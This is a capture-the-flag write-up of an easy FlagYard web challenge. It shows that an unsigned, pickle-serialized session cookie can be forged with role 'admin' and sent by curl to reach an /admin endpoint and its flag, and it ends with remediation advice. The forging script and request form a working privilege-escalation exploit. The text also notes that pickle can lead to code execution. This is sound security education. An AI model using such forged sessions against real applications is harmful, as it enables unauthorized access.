# Cucy — Web (Easy)

**Author:** Obito Uchiha — Team AKATSUKI **Platform:** FlagYard — Black Hat Training Labs **Category:** Web **Difficulty:** Easy **Target:** `http://t2jpdg8uvwnoawhh.playat.flagyard.com/`

---

## Challenge Description

> Dig your way through /admin

The application, **Cucy**, is a simple dashboard with a login page offering two demo accounts:

- `user / user123` (User access)
- `demo / demo123` (Demo access)

The dashboard's client-side JavaScript reveals an `/admin` endpoint that is conditionally rendered for admin users, along with a `loadAdmin()` function that fetches `/admin` and displays a `flag` field from the JSON response.

---

## Recon

Logging in as either `user` or `demo` returns a session cookie under the name `session_token`. Decoding the cookie value from Base64 reveals it begins with the bytes `\x80\x05`, which is the magic header for **Python's pickle protocol 5**.

This immediately stands out — the application is storing serialized Python objects, client-side, inside the session cookie, with **no visible signature or HMAC verification** (unlike Flask's default signed session cookies via `itsdangerous`).

### Decoding the cookie

```python
import pickle, base64

cookie = "gAWVjwAAAAAAAAB9lCiMCHVzZXJuYW1llIwEdXNlcpSMBHJvbGWUjAR1c2VylIwKY3JlYXRlZF9hdJSMCGRhdGV0aW1llIwIZGF0ZXRpbWWUk5RDCgfqBxMNFCcG6BuUhZRSlIwKZXhwaXJlc19hdJRoCEMKB+oHEw8UJwboIJSFlFKUjBBpc19hdXRoZW50aWNhdGVklIh1Lg=="
data = pickle.loads(base64.b64decode(cookie))
print(data)
```

**Output:**

```python
{
    'username': 'user',
    'role': 'user',
    'created_at': datetime.datetime(2026, 7, 19, 13, 20, 39, 452635),
    'expires_at': datetime.datetime(2026, 7, 19, 15, 20, 39, 452640),
    'is_authenticated': True
}
```

The `role` field is stored in plaintext inside the pickled object, and nothing about the cookie's structure suggests server-side integrity checking.

---

## Vulnerability

**Insecure Deserialization (CWE-502)** combined with **Broken Access Control (CWE-863)**.

The server trusts a client-supplied, pickle-serialized session object without validating its authenticity. Since `pickle.loads()` was clearly being used server-side to reconstruct the session dictionary, an attacker who understands the expected schema can simply **forge their own session object** with elevated privileges and have the server accept it at face value.

This class of bug is also a classic gateway to **Remote Code Execution**, since a malicious pickle stream can embed a `__reduce__` method that executes arbitrary code upon deserialization — though for this challenge, privilege escalation via a forged `role` field was sufficient.

---

## Exploitation

### Step 1 — Forge an admin session object

Using the exact schema recovered from the legitimate cookie, a new dictionary was crafted with `username` and `role` set to `admin`:

```python
import pickle, base64, datetime

data = {
    'username': 'admin',
    'role': 'admin',
    'created_at': datetime.datetime(2026, 7, 19, 13, 20, 39, 452635),
    'expires_at': datetime.datetime(2026, 7, 20, 15, 20, 39, 452640),
    'is_authenticated': True
}

payload = pickle.dumps(data, protocol=5)
cookie = base64.b64encode(payload).decode()
print(cookie)
```

**Forged cookie:**

```
gAWViwAAAAAAAAB9lCiMCHVzZXJuYW1llIwFYWRtaW6UjARyb2xllGgCjApjcmVhdGVkX2F0lIwIZGF0ZXRpbWWUjAhkYXRldGltZZSTlEMKB+oHEw0UJwboG5SFlFKUjApleHBpcmVzX2F0lGgHQwoH6gcUDxQnBugglIWUUpSMEGlzX2F1dGhlbnRpY2F0ZWSUiHUu
```

### Step 2 — Submit the forged cookie to `/admin`

```bash
curl -s -i "http://t2jpdg8uvwnoawhh.playat.flagyard.com/admin" \
  -H "Cookie: session_token=gAWViwAAAAAAAAB9lCiMCHVzZXJuYW1llIwFYWRtaW6UjARyb2xllGgCjApjcmVhdGVkX2F0lIwIZGF0ZXRpbWWUjAhkYXRldGltZZSTlEMKB+oHEw0UJwboG5SFlFKUjApleHBpcmVzX2F0lGgHQwoH6gcUDxQnBugglIWUUpSMEGlzX2F1dGhlbnRpY2F0ZWSUiHUu"
```

### Result

```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "active_users": 2,
  "flag": "FlagY{8eb24bc268ebcce571533ccfd6b2196d}",
  "server_info": "Cucy Server v1.3",
  "system_status": "operational"
}
```

The server deserialized the forged pickle, read `role: 'admin'` from it, and granted access to the admin-only endpoint — no additional authentication or signature check was performed.

---

## Flag

```
FlagY{8eb24bc268ebcce571533ccfd6b2196d}
```

---

## Root Cause

The application uses `pickle` to serialize session state directly into a cookie that is fully controlled by the client, and deserializes it with `pickle.loads()` on every request without any cryptographic integrity check (e.g., HMAC signing).

## Remediation

- **Never** use `pickle` (or any similarly unsafe serializer) on data that originates from — or is round-tripped through — the client. Pickle deserialization can lead to arbitrary code execution, not just data tampering.
- Use a safe, structured format such as `JSON` for session payloads.
- Sign and verify session cookies server-side (e.g., Flask's built-in signed sessions via `itsdangerous`, or JWTs with a verified signature) so that any tampering is detected and rejected.
- Enforce authorization checks against a trusted, server-side source of truth (e.g., a database-backed session store) rather than trusting client-supplied role claims.

---

_Obito Uchiha — Team AKATSUKI_
